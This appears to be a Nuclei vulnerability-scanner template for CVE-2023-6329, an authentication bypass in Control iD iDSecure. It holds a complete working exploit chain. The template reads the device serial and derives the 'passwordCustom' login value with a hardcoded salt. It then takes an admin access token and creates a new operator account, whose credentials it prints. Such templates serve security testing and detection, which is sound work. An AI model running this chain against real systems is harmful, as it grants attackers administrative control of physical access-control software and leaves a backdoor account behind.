flow: 'http(1);

  javascript();

  http(2);

  http(3);

  '
http:
- extractors:
  - internal: true
    json:
    - .serial
    name: serial
    part: body
    type: json
  matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - serial
  raw:
  - 'GET /api/login/unlockGetData HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - internal: true
    json:
    - .accessToken
    name: access-token
    part: body
    type: json
  matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - accessToken
  raw:
  - 'POST /api/login/ HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Content-Type: application/json


    {"passwordCustom": "{{javascript_response}}", "passwordRandom": "{{passwordRandom}}"}

    '
- extractors:
  - dsl:
    - '"USER: "+ username'
    - '"PASS: "+ password'
    type: dsl
  matchers:
  - condition: and
    dsl:
    - contains(content_type, "application/json")
    - contains_all(body, "code", "newID")
    type: dsl
  raw:
  - 'POST /api/operator/ HTTP/1.1

    Host: {{Hostname}}

    Authorization: Bearer {{access-token}}

    Content-Type: application/json


    {"idType": "1", "name": "{{username}}", "user": "{{username}}", "newPassword":
    "{{password}}", "password_confirmation": "{{password}}"}

    '
id: CVE-2023-6329
info:
  author: DhiyaneshDK,princechaddha
  classification:
    cpe: cpe:2.3:a:controlid:idsecure:4.7.32.0:*:*:*:*:*:*:*
    cve-id: CVE-2023-6329
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.90025
    epss-score: 0.02363
  description: 'An authentication bypass vulnerability exists in Control iD iDSecure
    v4.7.32.0. The login routine used by iDS-Core.dll contains a "passwordCustom"
    option that allows an unauthenticated attacker to compute valid credentials that
    can be used to bypass authentication and act as an administrative user.

    '
  impact: 'Successful exploitation could allow an attacker to bypass authentication
    controls.

    '
  metadata:
    fofa-query: body="iDSecure"
    max-request: 3
    product: idsecure
    vendor: controlid
    verified: true
  name: Control iD iDSecure - Authentication Bypass
  remediation: 'Apply the vendor-supplied patch or update to the latest firmware version
    to mitigate the vulnerability.

    '
  severity: critical
  tags: cve,cve2023,auth-bypass,idsecure,control-id,intrusive
javascript:
- args:
    passwordRandom: '{{passwordRandom}}'
    sha1Hash: '{{sha1Hash}}'
    sha256combined: '{{ sha256(sha1Hash+passwordRandom+''cid2016'') }}'
  code: 'var passwordRandom = passwordRandom;

    var sha1Hash = template.sha1Hash;

    var sha256Hash=(sha256combined.substring(0,6))

    var passwordCustom = parseInt(sha256Hash, 16).toString();

    passwordCustom

    '
variables:
  password: '{{randstr}}'
  passwordRandom: '{{rand_text_numeric(10)}}'
  sha1Hash: '{{sha1(serial)}}'
  username: '{{rand_base(8)}}'
